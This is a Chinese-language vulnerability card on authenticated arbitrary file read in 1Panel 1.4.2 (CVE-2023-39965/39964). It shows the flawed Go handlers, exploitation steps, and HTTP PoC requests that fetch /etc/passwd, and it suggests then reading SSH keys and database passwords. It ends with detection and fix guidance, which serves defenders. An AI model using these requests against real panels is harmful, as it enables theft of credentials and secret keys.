---
id: web-golang-1panel-files-path-arbitrary-read-download
title: 1Panel files 接口未校验 path：/download/bypath 与 /loadfile 任意文件下载/读取（CVE-2023-39965 / CVE-2023-39964）
type: scenario
domain: web
path: web/golang
technique: 1panel-files-path-arbitrary-read-download
aliases:
- 1Panel 任意文件下载
- 1Panel 任意文件读取
- CVE-2023-39965
- CVE-2023-39964
- DownloadFile c.File
- LoadFromFile os.ReadFile
- dto.FilePath
tags:
- golang
- gin
- 1panel
- arbitrary-file-read
- path-traversal
- cve-2023-39965
- cve-2023-39964
- authenticated
cve:
- CVE-2023-39965
- CVE-2023-39964
affected_versions: 1Panel 1.4.2（原文源码分析版本；原文未给出官方受影响区间）
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V540
  verified_at: '2026-11-11T19:15:44+08:00'
  notes: 已对照 content.md 与 img01-08 核对：图04 dto.FilePath 仅 validate:"required"；图03 files 路由含 /download/bypath -> DownloadFile、/save -> SaveContent；图06/08 POST /api/v1/files/download/bypath {"path":"/etc/passwd"} 返回 200 与 passwd 内容；图07 源码 1Panel-1.4.2 中 DownloadFile 与 LoadFromFile 共用 FilePath，LoadFromFile 为 os.ReadFile(req.Path)（原文 39964 复现图实际仍是 /download/bypath，loadfile 依据为图07 源码与正文，卡未误引）。未验证点：未本地复现 loadfile 回显；接口均需登录会话。版本：原文仅给出源码分析版本 1.4.2，未给官方受影响区间，卡内 affected_versions 已按此标注，未改。
---

## 一句话结论

1Panel 的 `/api/v1/files/download/bypath`（`BaseApi.DownloadFile`）与 `/api/v1/files/loadfile`（`BaseApi.LoadFromFile`）都直接使用请求 JSON 中的 `path` 字段：前者调用 `gin.Context.File(req.Path)` 把任意文件当作响应返回，后者用 `os.ReadFile(req.Path)` 读取后回显内容；`path` 只校验了 `required`，没有做目录限制或白名单，登录面板的任意用户即可读取服务器上的任意文件（如 `/etc/passwd`、配置与密钥）。

## 原理

- 两个接口共用请求结构：
  ```go
  type FilePath struct {
      Path string `json:"path" validate:"required"`
  }
  ```
  `validate:"required"` 只保证非空，不限制取值范围；Gin 用 `c.ShouldBindJSON(&req)` 绑定后仅调用 `global.VALID.Struct(req)` 做必填校验。
- 下载接口：
  ```go
  func (b *BaseApi) DownloadFile(c *gin.Context) {
      ...
      c.File(req.Path)   // → http.ServeFile(c.Writer, c.Request, filepath)
  }
  ```
  `gin.Context.File` 直接调用 `http.ServeFile`，filepath 完全来自请求，任意绝对路径都能被打开并返回。
- 读取接口：
  ```go
  content, err := os.ReadFile(req.Path)
  helper.SuccessWithData(c, string(content))
  ```
  同样没有路径规范化/基目录校验，文件内容被转成字符串放进 JSON 响应。
- 之所以成立：开发者把“文件路径”当作可信的内部参数（正常前端从文件管理器传入），但 API 直接暴露给已登录用户；Gin 的 `File`/`os.ReadFile` 本身不做沙箱，缺少业务层校验时就是任意文件读取。
- 与路径穿越的区别：这里不需要 `../`，直接传绝对路径即可；`validate` 也不过滤绝对路径。

## 触发条件

- 目标为存在该问题的 1Panel 版本（原文分析的是 1.4.2 源码）。
- 攻击者持有面板的有效会话（请求携带 `pssession` Cookie；接口位于 `/api/v1` 私有路由组，受 JWT/Session/密码过期中间件保护）。
- 目标进程对要读取的文件有读权限（面板常以 root 运行，可读大部分系统文件）。

## 利用步骤

1. 登录面板获取有效会话 Cookie（或通过其他漏洞获得）。
2. 通过 Swagger（`/1panel/swagger/index.html`，受 JWT+Session 保护）确认接口与参数结构。
3. 发送下载请求：`POST /api/v1/files/download/bypath`，JSON `{"path":"/etc/passwd"}`，响应体即文件内容。
4. 或发送读取请求：`POST /api/v1/files/loadfile`，同样 `{"path":"/etc/passwd"}`，内容在 JSON `data` 字段中回显。
5. 按需读取面板配置、数据库口令、SSH 私钥、应用配置文件等敏感文件，扩大影响。

## PoC

```http
POST /api/v1/files/download/bypath HTTP/1.1
Host: target:port
Content-Type: application/json
Cookie: pssession=<有效会话>

{"path":"/etc/passwd"}
```

响应（节选）：

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

读取接口：

```http
POST /api/v1/files/loadfile HTTP/1.1
Host: target:port
Content-Type: application/json
Cookie: pssession=<有效会话>

{"path":"/etc/passwd"}
```

## 变体与关联

- 变体：`/files/download`（GET，按文件 ID）与 `/files/chunkdownload` 等其他文件接口若同样缺少归属校验，也可组合利用；先读配置拿凭据再横向。
- 关联：[[web-golang-1panel-files-save-arbitrary-file-write-authorized-keys]]（同一 files 路由组的任意文件写入）；[[web-golang-1panel-firewall-ip-command-injection-cve-2023-37477]]（同一面板的另一个 CVE）。
- 边界：面板运行在低权限账户、目标文件无读权限时影响降级；接口若增加基目录白名单/`filepath.Clean` + `HasPrefix` 校验则失效。

## 检测与防御

- 检测：`/files/download/bypath`、`/files/loadfile` 请求的 `path` 为绝对路径或包含 `/etc/`、`/root/`、`..` 等敏感路径；短时间大量读取不同文件；响应体大小与内容类型异常（如 JSON 接口返回 passwd 文本）。
- 防御：对 `path` 做白名单/基目录校验（`filepath.Clean` 后必须位于允许目录内），拒绝绝对路径与 `..`；文件操作改为按文件 ID 映射，服务端保存真实路径；最小权限运行面板；对文件接口做审计与速率限制。
